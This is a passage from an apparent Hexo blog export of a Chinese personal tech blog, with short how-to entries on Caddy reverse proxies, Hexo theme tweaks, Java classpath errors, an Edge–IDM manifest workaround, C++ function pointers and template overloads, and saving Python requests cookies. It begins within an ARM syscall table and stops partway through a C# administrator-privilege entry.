<td>rwf_t flags</td>
</tr>
<tr>
<td align="center">288</td>
<td>pkey_mprotect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td>
<td align="center">0x120</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td>int pkey</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">289</td>
<td>pkey_alloc</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td>
<td align="center">0x121</td>
<td>unsigned long flags</td>
<td>unsigned long init_val</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">290</td>
<td>pkey_free</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td>
<td align="center">0x122</td>
<td>int pkey</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">291</td>
<td>statx</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td>
<td align="center">0x123</td>
<td>int dfd</td>
<td>const char *path</td>
<td>unsigned flags</td>
<td>unsigned mask</td>
<td>struct statx *buffer</td>
<td>-</td>
</tr>
<tr>
<td align="center">425</td>
<td>io_uring_setup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_uring_setup">cs/</a></td>
<td align="center">0x1a9</td>
<td>u32 entries</td>
<td>struct io_uring_params *p</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">426</td>
<td>io_uring_enter</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_uring_enter">cs/</a></td>
<td align="center">0x1aa</td>
<td>unsigned int fd</td>
<td>u32 to_submit</td>
<td>u32 min_complete</td>
<td>u32 flags</td>
<td>const void *argp</td>
<td>size_t argsz</td>
</tr>
<tr>
<td align="center">427</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ab</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">428</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ac</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">429</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ad</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">430</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ae</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">431</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1af</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">432</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b0</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">433</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">434</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">435</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b3</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">436</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">437</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">438</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">439</td>
<td>faccessat2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat2">cs/</a></td>
<td align="center">0x1b7</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>caddy2配置反向代理</title>
    <url>/2022/05/26/caddy2-reverse-proxy/</url>
    <content><![CDATA[<h2 id="编辑CaddyFile"><a href="#编辑CaddyFile" class="headerlink" title="编辑CaddyFile"></a>编辑CaddyFile</h2><h3 id="v2"><a href="#v2" class="headerlink" title="v2"></a>v2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bd.xxx.com &#123;</span><br><span class="line">	reverse_proxy https://www.baidu.com &#123;</span><br><span class="line">		header_up Host &#123;http.reverse_proxy.upstream.hostport&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="v1"><a href="#v1" class="headerlink" title="v1"></a>v1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bd.xxx.com &#123;</span><br><span class="line">gzip</span><br><span class="line">tls xxx@xxx.xx</span><br><span class="line">proxy / https://www.baidu.com</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>caddy配置反向代理</title>
    <url>/2020/04/11/caddy-reverse-proxy/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><a href="https://blog.xhyeax.com/2022/05/26/caddy2-reverse-proxy/">caddy2配置反向代理</a></p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><blockquote>
<p>申请SSL证书前，请务必提前解析好域名记录(解析后最好等一会，以全球生效)</p>
</blockquote>
<h3 id="申请证书"><a href="#申请证书" class="headerlink" title="申请证书"></a>申请证书</h3><p>此处可使用<code>Caddy</code>自动申请的<code>Let&#39;s Encrypt</code>证书，个人使用的是<code>CloudFlare</code>的免费证书</p>
<h3 id="编辑CaddyFile"><a href="#编辑CaddyFile" class="headerlink" title="编辑CaddyFile"></a>编辑CaddyFile</h3><h4 id="使用其他证书"><a href="#使用其他证书" class="headerlink" title="使用其他证书"></a>使用其他证书</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bd.xxx.com &#123;</span><br><span class="line">gzip</span><br><span class="line">tls /root/xxx.crt /root/xxx.key</span><br><span class="line">proxy / https://www.baidu.com</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用自动申请的证书"><a href="#使用自动申请的证书" class="headerlink" title="使用自动申请的证书"></a>使用自动申请的证书</h4><p>把tls选项改为邮箱（似乎不加也行）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bd.xxx.com &#123;</span><br><span class="line">gzip</span><br><span class="line">tls xxx@xxx.xx</span><br><span class="line">proxy / https://www.baidu.com</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="重启Caddy"><a href="#重启Caddy" class="headerlink" title="重启Caddy"></a>重启Caddy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service caddy restart</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://51.ruyo.net/3461.html">利用 Caddy 轻松实现反向代理/镜像（支持自签SSL证书）</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题增加鼠标点击效果</title>
    <url>/2018/11/30/click-word/</url>
    <content><![CDATA[<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>将以下代码放到主题源文件目录下，如 <code>/themes/yilia/source/js/</code> 下新建文件 <code>click-word.js</code>，代码见下文。<br>下载jquery文件（<a href="https://code.jquery.com/jquery-3.3.1.min.js">目前最新版本</a>），放到同一目录下（个人喜好）。<br>修改布局文件，<code>/themes/next/layout/_layout.ejs</code>，在末尾body中添加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 页面点击特效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/js/jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/js/click-word.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>保存后重新生成即可</p>
<h2 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a_idx = <span class="number">0</span>;</span><br><span class="line">jQuery(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;body&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;富强&quot;</span>, <span class="string">&quot;民主&quot;</span>, <span class="string">&quot;文明&quot;</span>, <span class="string">&quot;和谐&quot;</span>, <span class="string">&quot;自由&quot;</span>, <span class="string">&quot;平等&quot;</span>, <span class="string">&quot;公正&quot;</span> ,<span class="string">&quot;法治&quot;</span>, <span class="string">&quot;爱国&quot;</span>, <span class="string">&quot;敬业&quot;</span>, <span class="string">&quot;诚信&quot;</span>, <span class="string">&quot;友善&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> $i = $(<span class="string">&quot;&lt;span /&gt;&quot;</span>).text(a[a_idx]);</span><br><span class="line">        a_idx = (a_idx + <span class="number">1</span>) % a.length;</span><br><span class="line">        <span class="keyword">var</span> x = e.pageX,</span><br><span class="line">        y = e.pageY;</span><br><span class="line">        $i.css(&#123;</span><br><span class="line">            <span class="string">&quot;z-index&quot;</span>: <span class="number">999999999999999999999999999999999999999999999999999999999999999999999</span>,</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: y - <span class="number">20</span>,</span><br><span class="line">            <span class="string">&quot;left&quot;</span>: x,</span><br><span class="line">            <span class="string">&quot;position&quot;</span>: <span class="string">&quot;absolute&quot;</span>,</span><br><span class="line">            <span class="string">&quot;font-weight&quot;</span>: <span class="string">&quot;bold&quot;</span>,</span><br><span class="line">            <span class="string">&quot;color&quot;</span>: <span class="string">&quot;#ff6651&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">&quot;body&quot;</span>).append($i);</span><br><span class="line">        $i.animate(&#123;</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: y - <span class="number">180</span>,</span><br><span class="line">            <span class="string">&quot;opacity&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="number">1500</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $i.remove();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.wujunjie.net/2018/03/03/jquery%E5%AF%8C%E5%BC%BA%E3%80%81%E6%B0%91%E4%B8%BB%E3%80%81%E6%96%87%E6%98%8E%E3%80%81%E5%92%8C%E8%B0%90%E7%89%B9%E6%95%88%E4%BB%A3%E7%A0%81/">jquery”富强、民主、文明、和谐”特效代码</a><br><a href="https://asdfv1929.github.io/2018/01/26/click-love/">Hexo NexT主题添加点击爱心效果</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>更换Hexo博客主题为NexT</title>
    <url>/2021/09/05/change-hexo-theme-to-next/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>换个了博客主题。主要参考<a href="https://theme-next.iissnan.com/">NexT 使用文档</a>进行配置，记录一下遇到的问题。</p>
<span id="more"></span>

<h2 id="语言配置"><a href="#语言配置" class="headerlink" title="语言配置"></a>语言配置</h2><p><code>主题配置文件</code>和<code>站点配置文件</code>都需要设置<code>language: zh-CN</code></p>
<h2 id="阅读全文"><a href="#阅读全文" class="headerlink" title="阅读全文"></a>阅读全文</h2><p>在文章中使用 <code>&lt;!-- more --&gt;</code> 手动进行截断 (Hexo 提供的方式)</p>
<p>由于修改了文件，文章修改时间都变成了同一天。</p>
<p>可以设置<code>主题配置文件</code>的<code>updated_at.enable</code>为<code>false</code>，关闭修改时间显示。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/54237326/answer/485305059">hexo next language设置成zh-CN，也有zh-CN.yml文件，就是不显示中文？ - 杨坤的回答 - 知乎</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行运行java class文件提示“找不到或无法加载主类”的解决方法</title>
    <url>/2020/03/30/cmd-java-class-file/</url>
    <content><![CDATA[<h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><blockquote>
<p>1.java指令默认在寻找class文件的地址是通过CLASSPATH环境变量中指定的目录中寻找的。<br>2.忽略了package的影响。加载一个类，是需要完整的类名，所以必须要把包名带上</p>
</blockquote>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>指定生成class文件的文件夹为classpath，执行java指令，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -classpath &quot;D:\source\Java\Painter\bin&quot; app.OpenGLApp</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/IToBeNo_1/article/details/90115468">控制台中运行java类提示”找不到或无法加载主类”错误的原因及解决方案</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Microsoft Edge (Chromium内核)安装IDM插件</title>
    <url>/2019/09/16/chromium-edge-idm-support/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>今天从<code>Chrome</code>迁移到了<code>Microsoft Edge, based on Chromium</code><br>期间发现谷歌应用商店居然没有IDM拓展，只有<a href="https://chrome.google.com/webstore/detail/open-with-internet-downlo/epgilldoipfbdlneomlmegekaoonchcj">Open With Internet Download Manager</a><br>而这个插件需要打<code>native messaging host</code>补丁，补丁不适用于<code>Edge</code>，于是自己研究了一下解决方法</p>
<h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><p>修改配置文件，手动添加授权拓展</p>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>定位到注册表<code>计算机\HKEY_CURRENT_USER\Software\Google\Chrome\NativeMessagingHosts\com.microsoft.browsercore</code><br>项目值为<code>C:\Program Files\Windows Security\BrowserCore\manifest.json</code><br>定位到该文件，修改文件权限后，在<code>allowed_origins</code>中添加:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;chrome-extension://epgilldoipfbdlneomlmegekaoonchcj/&quot;,</span><br></pre></td></tr></table></figure>
<p>重启<code>Edge</code>即可正常调用<code>IDM</code><br>PS: 需要手动修改下拓展设置，配置为本地IDM路径</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/alexmarcoo/open-in-native-client">Open-in Native Client</a><br><a href="https://www.cnblogs.com/champagne/p/4861209.html">Chrome浏览器扩展开发系列之十四：本地消息机制Native messaging</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中类的成员函数的函数指针</title>
    <url>/2019/05/01/cpp-class-member-func-ptr/</url>
    <content><![CDATA[<h2 id="获取指针"><a href="#获取指针" class="headerlink" title="获取指针"></a>获取指针</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">staticmember</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;static&quot;</span> &lt;&lt; endl; &#125;	 <span class="comment">//static member</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">nonstatic</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;nonstatic&quot;</span> &lt;&lt; endl; &#125;			 <span class="comment">//nonstatic member</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">virtualmember</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;virtual&quot;</span> &lt;&lt; endl; &#125;; <span class="comment">//virtual member</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	<span class="comment">//static成员函数,取得的是该函数在内存中的实际地址，而且因为static成员是全局的，所以不能用A::限定符</span></span><br><span class="line">	<span class="built_in"><span class="keyword">void</span></span> (*ptrstatic)() = &amp;A::staticmember;</span><br><span class="line">	<span class="comment">//nonstatic成员函数 取得的是该函数在内存中的实际地址</span></span><br><span class="line">	<span class="built_in"><span class="keyword">void</span></span> (A::*ptrnonstatic)() = &amp;A::nonstatic;</span><br><span class="line">	<span class="comment">//虚函数取得的是虚函数表中的偏移值，这样可以保证能过指针调用时同样的多态效果</span></span><br><span class="line">	<span class="built_in"><span class="keyword">void</span></span> (A::*ptrvirtual)() = &amp;A::virtualmember;</span><br><span class="line">	<span class="comment">//函数指针的使用方式</span></span><br><span class="line">	<span class="built_in">ptrstatic</span>();</span><br><span class="line">	(a.*ptrnonstatic)();</span><br><span class="line">	(a.*ptrvirtual)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="在map中使用指针"><a href="#在map中使用指针" class="headerlink" title="在map中使用指针"></a>在map中使用指针</h2><p>直接使用对应类型也是可以的，比如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">map&lt;string, <span class="keyword">void</span> (A::*)()&gt; zeroParmsFuns;</span><br></pre></td></tr></table></figure>
<p>不过为了方便起见，还是自定义类型吧</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(A::*func)</span><span class="params">()</span></span>;</span><br><span class="line">map&lt;string, func&gt; zeroParmsFuns;</span><br></pre></td></tr></table></figure>
<p>使用迭代器来遍历map，funcName是函数名，对应map的key</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">map&lt;string, func&gt;::iterator iter = zeroParmsFuns.<span class="built_in">find</span>(funcName);</span><br><span class="line">       <span class="keyword">if</span> (iter != zeroParmsFuns.<span class="built_in">end</span>())</span><br><span class="line">       &#123;</span><br><span class="line">           (<span class="keyword">this</span>-&gt;*(iter-&gt;second))();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/lidabo/p/3597559.html">C++中怎么获取类的成员函数的函数指针？</a><br><a href="https://www.cnblogs.com/limedia/p/cxx_class_inner_poiner.html">C++ 类内函数指针的使用的使用</a></p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Cookie的本地保存和读取(Python requests模块)</title>
    <url>/2018/12/13/cookies-local-save-read/</url>
    <content><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>获取到cookie后转化为dictionary（使用<code>requests.utils.dict_from_cookiejar</code>方法转化CookieJar为dictionary），再以字符串形式保存到文件<br>读取时把字符串转换为字典（<code>json.load</code>方法），再设置为requests请求的cookies</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这里有个坑，保存到文件时是单引号，使用json读取时需要双引号，所以需要replace一下</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换为dictionary</span></span><br><span class="line">load_cookies = requests.utils.dict_from_cookiejar(res.cookies)</span><br><span class="line"><span class="comment">#转换为字符串保存到文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">fo.write(<span class="built_in">str</span>(load_cookies))</span><br><span class="line">fo.close()</span><br></pre></td></tr></table></figure>
<h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##读取文件内容到text变量后</span></span><br><span class="line"><span class="comment">#转换为dictionary</span></span><br><span class="line">dic = json.loads(text.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>))</span><br><span class="line">res = requests.post(url,cookies=dic)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/42950252">Python——Cookie保存到本地</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>修复VSCode Segmentation Fault in cygwinS</title>
    <url>/2019/07/03/cpp_vscode_segmentation_fault_cygwinS/</url>
    <content><![CDATA[<h2 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h2><p>一般来说是因为爆栈了，使用动态数组即可。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/kangyupl/article/details/90723526">VSCODE调试时在cygwin.S中发生段错误</a></p>
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中模板类的输出流重载</title>
    <url>/2019/05/07/cpp-template-class-cout-overload/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在模板类中使用输出流重载发现报错，g++提示</p>
<blockquote>
<p>warning: friend declaration ‘std::ostream&amp; operator&lt;&lt;(std::ostream&amp;, const A<T>&amp;)’ declares a non-template function<br>note: (if this is not what you intended, make sure the function template has already been declared and add &lt;&gt; after the function name here)<br>增加&lt;&gt;后依旧报错，遂百度之，解决。</p>
</blockquote>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote>
<p>定义的友元函数还是一个模版，要实例化为参数变元后才能使用。也就是说，即使上面的友元看起来像函数定义，但是若没有经过参数化，编译器就不会生成该函数的代码<br><a href="https://www.cnblogs.com/autosar/archive/2011/10/29/2228674.html">关于操作符的友元模版函数重载</a><br>个人理解是由于友元函数还没有给出声明（或者说是定义），编译器识别不出来。所以可以在类之前预先声明，而又因为该函数使用了类名，所以类名也要预先声明。</p>
</blockquote>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="1-在类内部加上友元函数体（不推荐）"><a href="#1-在类内部加上友元函数体（不推荐）" class="headerlink" title="1.在类内部加上友元函数体（不推荐）"></a>1.在类内部加上友元函数体（不推荐）</h3><h3 id="2-在类的定义之前对类和友元函数进行预声明，并在内部加上-lt-gt"><a href="#2-在类的定义之前对类和友元函数进行预声明，并在内部加上-lt-gt" class="headerlink" title="2.在类的定义之前对类和友元函数进行预声明，并在内部加上&lt;&gt;"></a>2.在类的定义之前对类和友元函数进行预声明，并在内部加上&lt;&gt;</h3><p>即在类定义前加上如下代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">class</span> <span class="title">A</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; ostream &amp;<span class="keyword">operator</span>&lt;&lt; (ostream &amp;out, <span class="keyword">const</span> A&lt;T&gt; &amp;a);</span><br></pre></td></tr></table></figure>
<p>在类定义中给输出流重载函数加上&lt;&gt;：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt; &lt;&gt;(ostream &amp;, <span class="keyword">const</span> A&lt;T&gt; &amp;);</span><br></pre></td></tr></table></figure>
<h4 id="注意：重载函数定义时不需要加上-lt-gt"><a href="#注意：重载函数定义时不需要加上-lt-gt" class="headerlink" title="注意：重载函数定义时不需要加上&lt;&gt;"></a>注意：重载函数定义时不需要加上&lt;&gt;</h4><p>与其他友元函数定义类似：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt; (ostream &amp;out, <span class="keyword">const</span> A&lt;T&gt; &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		out &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="3-在类中再使用一次模板（自用）"><a href="#3-在类中再使用一次模板（自用）" class="headerlink" title="3.在类中再使用一次模板（自用）"></a>3.在类中再使用一次模板（自用）</h3><p>参考<a href="https://www.cnblogs.com/autosar/archive/2011/10/29/2228674.html">关于操作符的友元模版函数重载</a><br>直接修改类定义中的输出流重载函数为：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1&gt;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;, <span class="keyword">const</span> A&lt;T1&gt; &amp;);</span><br></pre></td></tr></table></figure>
<p>重载函数定义不需要修改为T1（当然改也行）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/larryzeal/p/5664418.html">C++ 模板类友元之输出流操作符重载</a><br><a href="https://www.cnblogs.com/autosar/archive/2011/10/29/2228674.html">关于操作符的友元模版函数重载</a></p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>VS设置C#默认以管理员身份调试及启动</title>
    <url>/2020/04/14/csharp-run-as-admin/</url>
    <content><![CDATA[<h2 id="默认以管理员身份调试"><a href="#默认以管理员身份调试" class="headerlink" title="默认以管理员身份调试"></a>默认以管理员身份调试</h2><p>右键项目，添加应用程序清单文件。<br>将<code>&lt;requestedExecutionLevel level=&quot;asInvoker&quot; uiAccess=&quot;false&quot; /&gt;</code><br><code>asInvoker</code>修改为<code>requireAdministrator</code><br>保存后再次点击运行，将提示使用其他凭据重新启动。</p>
<h2 id="程序自动请求管理员权限"><a href="#程序自动请求管理员权限" class="headerlink" title="程序自动请求管理员权限"></a>程序自动请求管理员权限</h2><p>修改<code>Program.cs</code>的<code>Main</code>方法:</p>
